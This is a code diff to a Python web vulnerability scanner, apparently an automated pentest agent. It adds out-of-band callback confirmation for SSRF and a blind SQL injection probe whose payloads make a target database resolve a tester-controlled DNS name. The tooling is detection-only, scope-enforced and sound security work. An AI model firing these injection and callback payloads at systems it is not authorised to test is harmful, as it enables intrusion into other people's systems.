@@ -6,8 +6,9 @@ through the EnforcingClient; payloads are minimal and non-destructive.
 """
 from __future__ import annotations
 
+import time
 import urllib.parse
-from typing import Any
+from typing import TYPE_CHECKING, Any
 
 import httpx
 
@@ -15,6 +16,10 @@ from ..db import Database
 from ..errors import AgentError
 from ..scope.client import EnforcingClient
 from ..tools import Tool, ToolResult
+from ..oob.interactsh import unique_id_of  # noqa: F401 — re-exported for tests
+
+if TYPE_CHECKING:  # pragma: no cover — typing only, avoids import cost
+    from ..oob.interactsh import FakeInteractshManager, InteractshManager
 from .payloads import (
     REDIRECT_PAYLOADS,
     SSRF_BODY_MARKERS,
@@ -40,6 +45,9 @@ def probe_reflection(client: EnforcingClient, url: str, param: str,
                      extra_payloads: list[str] | None = None) -> dict[str, Any]:
     """Marker-reflection probe (XSS/SSTI). Deterministic: unique marker per run."""
     marker = fresh_marker()
+    note_marker = getattr(client, "note_marker", None)  # M5a: guard awareness
+    if callable(note_marker):
+        note_marker(marker)
     payloads = [p.replace("{marker}", marker) for p in XSS_PROBES]
     if extra_payloads:
         payloads += [p.replace("{marker}", marker) for p in extra_payloads]
@@ -135,9 +143,21 @@ def probe_redirect(client: EnforcingClient, url: str, param: str) -> dict[str, A
 
 
 def probe_ssrf(client: EnforcingClient, url: str, param: str,
-               oob_domain: str | None = None, port: int = 80) -> dict[str, Any]:
-    """SSRF probe. Evidence = known body markers OR a control differential
-    (internal URL returns content while a control URL fails)."""
+               oob_domain: str | None = None, port: int = 80,
+               oob: "InteractshManager | FakeInteractshManager | None" = None,
+               wait_seconds: float = 8.0) -> dict[str, Any]:
+    """SSRF probe: internal-differential evidence plus a managed OOB callback
+    check. The OOB payload is injected as plain parameter data; the callback
+    itself is made by the target (outside our network layer) and correlated
+    via interactsh (M5b).
+
+    oob: an InteractshManager/FakeInteractshManager. A plain string is still
+    accepted for backwards compatibility (no correlation, never confirms).
+    """
+    probe_id = f"ssrf:{param}:{url}"
+    reserved: str | None = None
+    if oob is not None and not isinstance(oob, str):
+        reserved = oob.reserve(probe_id)
     baseline_body: str | None = None
     try:
         baseline = client.get(_inject(url, param, "http://ssrf-control.invalid/"))
@@ -161,15 +181,41 @@ def probe_ssrf(client: EnforcingClient, url: str, param: str,
                          "body_markers": body_markers,
                          "differential": differential})
     oob_hit = None
-    if oob_domain:
+    if reserved:
         try:
-            resp = client.get(_inject(url, param, f"https://{oob_domain}/"))
-            if resp.status_code < 400:
-                oob_hit = {"payload": f"https://{oob_domain}/",
-                           "note": "server fetched OOB URL (HTTP-level; verify callback in interactsh)"}
+            # the callback bait: an in-scope request whose parameter points the
+            # target at OUR reserved callback host
+            client.get(_inject(url, param, f"http://{reserved}/m5b"))
         except Exception:  # noqa: BLE001
             pass
-    return {"ok": True, "vulnerable": bool(hits or oob_hit),
+        deadline = time.time() + max(0.0, wait_seconds)
+        while time.time() < deadline:
+            events = oob.poll(probe_id)  # type: ignore[union-attr]
+            if events:
+                protocols = sorted({str(e.get("protocol", "?")) for e in events})
+                oob_hit = {
+                    "payload": reserved,
+                    "probe_id": probe_id,
+                    "interactions": len(events),
+                    "protocols": protocols,
+                    "confirmed": True,
+                    "note": "target fetched our callback URL (correlated via interactsh)",
+                }
+                break
+            time.sleep(0.5)
+        if oob_hit is None:
+            oob_hit = {"payload": reserved, "probe_id": probe_id,
+                       "interactions": 0, "confirmed": False,
+                       "note": "no callback within wait window"}
+    elif isinstance(oob, str) and oob:
+        try:
+            resp = client.get(_inject(url, param, f"https://{oob}/"))
+            if resp.status_code < 400:
+                oob_hit = {"payload": f"https://{oob}/",
+                           "note": "server fetched OOB URL (uncorrelated; not confirmatory)"}
+        except Exception:  # noqa: BLE001
+            pass
+    return {"ok": True, "vulnerable": bool(hits or (oob_hit or {}).get("confirmed")),
             "internal_hits": hits, "oob": oob_hit, "param": param}
 
 
@@ -198,6 +244,77 @@ def probe_idor(client: EnforcingClient, url_template: str,
         "status": resp.status_code,
         "foreign_url": url_b,
         "behaves_like_own_object": same_as_own,
+    }
+
+
+def probe_sqli_oob(client: EnforcingClient, url: str, param: str,
+                   oob: "InteractshManager | FakeInteractshManager",
+                   method: str = "GET",
+                   dbms: str = "sqlite", wait_seconds: float = 8.0) -> dict[str, Any]:
+    """Blind SQLi detection via DNS callbacks: inject a payload that makes the
+    database resolve a per-request subdomain of our reserved OOB payload.
+    Correlated callbacks confirm injection even with zero visible output.
+
+    Currently supported: MySQL/MSSQL/Postgres/SQLite concatenation shapes that
+    produce a DNS lookup through the DB's own resolver functions. Payloads are
+    detection-only (single lookup, no data read).
+    """
+    probe_id = f"sqli-oob:{param}:{url}"
+    reserved = oob.reserve(probe_id)
+    if not reserved:
+        return {"ok": False, "error": "OOB payload pool exhausted"}
+    base = unique_id_of(reserved)
+    domain = reserved.split(".", 1)[1]
+
+    def _concat(expr: str) -> str:
+        # per-DBMS concat operators/functions that keep it one expression
+        if dbms in ("mysql",):
+            return f"CONCAT('{base}.',({expr}),'.{domain}')"
+        if dbms in ("mssql",):
+            return f"'{base}.'+({expr})+'.{domain}'"
+        if dbms in ("postgres",):
+            return f"'{base}.'||({expr})||'.{domain}'"
+        return f"'{base}.'||({expr})||'.{domain}'"  # sqlite default
+
+    # detection-only expressions: no table data, just constants/functions
+    exprs = {
+        "sqlite": ["sqlite_version()"],
+        "mysql": ["version()"],
+        "mssql": ["@@version"],
+        "postgres": ["version()"],
+    }.get(dbms, ["1"])
+    payloads = [_concat(e) for e in exprs]
+
+    def send(value: str) -> httpx.Response:
+        if method.upper() == "POST":
+            return client.post(url, data={param: value})
+        return client.get(_inject(url, param, value))
+
+    sent: list[str] = []
+    for payload in payloads:
+        try:
+            send(payload)
+            sent.append(payload)
+        except Exception:  # noqa: BLE001
+            continue
+
+    deadline = time.time() + max(0.0, wait_seconds)
+    events: list[dict] = []
+    while time.time() < deadline:
+        events = oob.poll(probe_id)
+        if events:
+            break
+        time.sleep(0.5)
+    return {
+        "ok": True,
+        "vulnerable": bool(events),
+        "signal": "oob-dns-callback" if events else "none",
+        "dbms": dbms,
+        "payloads_sent": len(sent),
+        "oob": {"payload": reserved, "probe_id": probe_id,
+                "interactions": len(events), "confirmed": bool(events)},
+        "param": param,
+        "note": "DNS callback proves DB-level code execution path; detection only",
     }
 
 
@@ -243,13 +360,26 @@ class XssProbeTool(ProbeTool):
 
 class SqliProbeTool(ProbeTool):
     name = "probe_sqli"
-    description = ("Test a URL parameter for SQL injection via error signatures "
-                   "and boolean differential. Args: url, param [, method=GET|POST].")
+    description = ("Test a URL parameter for SQL injection via error signatures, "
+                   "boolean differential, and (when enabled) OOB DNS callbacks. "
+                   "Args: url, param [, method=GET|POST].")
     probe_name = "SQL Injection (probe)"
+
+    def __init__(self, client: EnforcingClient, db: Database,
+                 oob=None) -> None:
+        super().__init__(client, db)
+        self.oob = oob
 
     def run(self, url: str, param: str, method: str = "GET") -> ToolResult:
         try:
-            ev = probe_sqli(self.client, url, param, method=method.upper())
+            if self.oob is not None:
+                ev = probe_sqli_oob(self.client, url, param, self.oob,
+                                    method=method.upper())
+                if not ev.get("vulnerable"):
+                    # fall back to the classical probe before concluding
+                    ev = probe_sqli(self.client, url, param, method=method.upper())
+            else:
+                ev = probe_sqli(self.client, url, param, method=method.upper())
         except AgentError as exc:
             return ToolResult(False, str(exc))
         ev["method"] = method.upper()
@@ -273,14 +403,20 @@ class RedirectProbeTool(ProbeTool):
 class SsrfProbeTool(ProbeTool):
     name = "probe_ssrf"
     description = ("Test whether a URL parameter makes the server fetch attacker-"
-                   "controlled URLs (internal + OOB). Args: url, param "
-                   "[, oob_domain from interactsh_payloads] [, port].")
+                   "controlled URLs. With an OOB manager attached, a correlated "
+                   "callback CONFIRMS blind SSRF. Args: url, param [, port].")
     probe_name = "SSRF (probe)"
+
+    def __init__(self, client: EnforcingClient, db: Database,
+                 oob=None) -> None:
+        super().__init__(client, db)
+        self.oob = oob
 
     def run(self, url: str, param: str, oob_domain: str | None = None,
             port: int = 80) -> ToolResult:
         try:
-            ev = probe_ssrf(self.client, url, param, oob_domain=oob_domain, port=int(port))
+            ev = probe_ssrf(self.client, url, param, oob_domain=oob_domain,
+                            port=int(port), oob=self.oob)
         except AgentError as exc:
             return ToolResult(False, str(exc))
         ev["port"] = int(port)
@@ -302,8 +438,11 @@ class IdorProbeTool(ProbeTool):
         return self._store(url_template, "id", ev)
 
 
-def build_probe_tools(client: EnforcingClient, db: Database) -> dict[str, Tool]:
-    tools = [XssProbeTool(client, db), SqliProbeTool(client, db),
-             RedirectProbeTool(client, db), SsrfProbeTool(client, db),
+def build_probe_tools(client: EnforcingClient, db: Database,
+                      oob=None) -> dict[str, Tool]:
+    """oob: an InteractshManager/FakeInteractshManager to attach to the probes
+    that support OOB confirmation (M5b)."""
+    tools = [XssProbeTool(client, db), SqliProbeTool(client, db, oob=oob),
+             RedirectProbeTool(client, db), SsrfProbeTool(client, db, oob=oob),
              IdorProbeTool(client, db)]
     return {t.name: t for t in tools}
